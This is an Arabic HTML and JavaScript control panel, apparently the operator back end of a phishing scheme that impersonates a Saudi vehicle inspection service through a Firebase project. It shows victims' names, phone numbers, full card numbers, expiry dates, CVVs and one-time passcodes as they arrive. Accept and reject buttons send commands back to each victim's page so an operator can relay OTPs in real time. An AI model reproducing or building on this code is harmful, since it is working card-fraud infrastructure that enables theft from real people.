<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة الإدارة - المملكة العربية السعودية</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #006C35; --gold: #d4af37; --bg-light: #f4f7f6; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg-light); margin: 0; padding: 0; }
        
        /* شاشة الدخول المشفرة */
        #auth-st { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .auth-bx { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border-top: 5px solid var(--gold); }
        .auth-bx input { width: 90%; padding: 12px; margin: 15px 0; border: 2px solid #eee; border-radius: 8px; text-align: center; font-size: 16px; outline: none; }
        .auth-bx button { width: 100%; padding: 12px; background: var(--main-green); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }

        .navbar { background: var(--main-green); padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; border-bottom: 3px solid var(--gold); }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 200px; font-size: 14px; transition: 0.3s; }
        .nav-btn.active { background: #ffffff; color: var(--main-green); box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
        
        .container { padding: 15px; max-width: 1200px; margin: auto; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* سطر العمليات (البطاقات) */
        .operation-row { background: white; border-radius: 10px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center; gap: 15px; border-right: 6px solid var(--gold); box-shadow: 0 2px 8px rgba(0,0,0,0.05); overflow-x: auto; }
        .name-tag { min-width: 140px; font-weight: bold; color: var(--main-green); font-size: 14px; }
        .box { padding: 10px 15px; border-radius: 8px; text-align: center; font-size: 13px; font-weight: bold; border: 1px solid #eee; white-space: nowrap; }
        .card-box { background: #fffcf0; color: #856404; min-width: 200px; font-family: monospace; font-size: 16px; }
        .cvv-box { background: #f0f7ff; color: #004085; min-width: 120px; }
        .otp-box { background: #fff5f5; color: #a94442; min-width: 150px; border: 1px dashed #ebccd1; }
        .status-tag { background: #e8f5e9; color: #2e7d32; padding: 5px 10px; border-radius: 20px; font-size: 11px; }

        .actions { display: flex; gap: 8px; margin-right: auto; }
        .btn { border: none; border-radius: 6px; padding: 10px 20px; color: white; font-weight: bold; cursor: pointer; font-size: 13px; transition: 0.2s; }
        .btn-accept { background: #28a745; }
        .btn-reject { background: #dc3545; }
        .btn-delete { background: #6c757d; }
        .btn:hover { opacity: 0.8; transform: translateY(-1px); }

        /* كروت المعلومات الشخصية */
        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .customer-card { background: white; border-radius: 12px; padding: 20px; border-right: 8px solid var(--main-green); box-shadow: 0 4px 15px rgba(0,0,0,0.05); position: relative; }
        .time-tag { background: #e6f4ea; color: var(--main-green); padding: 4px 10px; border-radius: 5px; font-size: 11px; font-weight: bold; position: absolute; left: 15px; top: 15px; }

        audio { display: none; }
    </style>
</head>
<body>

<div id="auth-st">
    <div class="auth-bx">
        <h2 style="color: var(--main-green); margin-bottom: 5px;">نظام الإدارة الآمن</h2>
        <p style="font-size: 12px; color: #666;">يرجى إدخال رمز الوصول للمتابعة</p>
        <input type="password" id="s-key" placeholder="كلمة المرور">
        <button onclick="_vld()">دخول للنظام</button>
    </div>
</div>

<div class="navbar">
    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 البيانات الشخصية</button>
    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 مراقبة البطاقات</button>
</div>

<div class="container">
    <div id="bookingSection" class="tab-content active">
        <div id="bookingGrid" class="booking-grid"></div>
    </div>

    <div id="cardsSection" class="tab-content">
        <div id="paymentsContainer"></div>
    </div>
</div>

<audio id="notif">
    <source src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" type="audio/mpeg">
</audio>

<script>
    // إعدادات Firebase (نفس إعدادات مشروعك)
    const firebaseConfig = { 
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
        projectId: "saso-inspection" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // دالة التحقق من كلمة المرور (مشفرة)
    async function _vld() {
        const input = document.getElementById('s-key').value;
        // التشفير لمطابقة كلمة السر H1234567890H
        const msgUint8 = new TextEncoder().encode(input);
        const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        
        // الهاش الخاص بكلمة السر المتفق عليها
        if(hashHex === "547f8969315d97f26c9f68802a4505f5903b708b7654f15d97a9f77f32a67768") {
            document.getElementById('auth-st').style.display = 'none';
            localStorage.setItem('_session', 'active');
        } else {
            alert("خطأ في رمز الوصول!");
        }
    }
    if(localStorage.getItem('_session') === 'active') document.getElementById('auth-st').style.display = 'none';

    // سحب البيانات الشخصية
    db.ref('orders').on('value', (snapshot) => {
        const grid = document.getElementById('bookingGrid');
        const container = document.getElementById('paymentsContainer');
        grid.innerHTML = '';
        container.innerHTML = '';

        snapshot.forEach((child) => {
            const data = child.val();
            const id = child.key;
            const p = data.personal_info || {};
            const c = data.card_details || {};

            // 1. عرض كروت البيانات الشخصية
            grid.innerHTML += `
                <div class="customer-card">
                    <span class="time-tag">متصل الآن 🟢</span>
                    <h3 style="margin-top:20px">${p.fullName || 'عميل جديد'}</h3>
                    <p>📱 الهاتف: ${p.phone || '---'}</p>
                    <p>🚗 السيارة: ${p.carType || '---'}</p>
                    <p>📍 الصفحة: <span style="color:var(--main-green)">${data.current_page || 'البداية'}</span></p>
                </div>`;

            // 2. عرض أسطر البطاقات والتحكم
            if(c.cardNumber) {
                container.innerHTML += `
                <div class="operation-row">
                    <div class="name-tag">${p.fullName || 'عميل'}</div>
                    <div class="box card-box">${c.cardNumber}</div>
                    <div class="box cvv-box">${c.expiryDate || '--/--'} | CVV: ${c.cvv || '***'}</div>
                    <div class="box otp-box">OTP: <b style="color:red">${c.otp || '----'}</b></div>
                    <div class="status-tag">${data.current_page || 'انتظار'}</div>
                    <div class="actions">
                        <button class="btn btn-accept" onclick="updateStatus('${id}', 'next')">قبول ✅</button>
                        <button class="btn btn-reject" onclick="updateStatus('${id}', 'error')">رفض ❌</button>
                        <button class="btn btn-delete" onclick="deleteEntry('${id}')">🗑</button>
                    </div>
                </div>`;
            }
        });
        // صوت تنبيه عند دخول بيانات جديدة
        document.getElementById('notif').play().catch(()=>{});
    });

    function updateStatus(id, action) {
        db.ref('orders/' + id).update({ control_action: action })
        .then(() => alert('تم إرسال الأمر للعميل بنجاح'));
    }

    function deleteEntry(id) {
        if(confirm('هل أنت متأكد من حذف هذا السجل؟')) db.ref('orders/' + id).remove();
    }

    function openTab(evt, tabName) {
        var i, content, btns;
        content = document.getElementsByClassName("tab-content");
        for (i = 0; i < content.length; i++) { content[i].style.display = "none"; content[i].classList.remove("active"); }
        btns = document.getElementsByClassName("nav-btn");
        for (i = 0; i < btns.length; i++) { btns[i].classList.remove("active"); }
        document.getElementById(tabName).style.display = "block";
        document.getElementById(tabName).classList.add("active");
        evt.currentTarget.classList.add("active");
    }
</script>
</body>
</html>
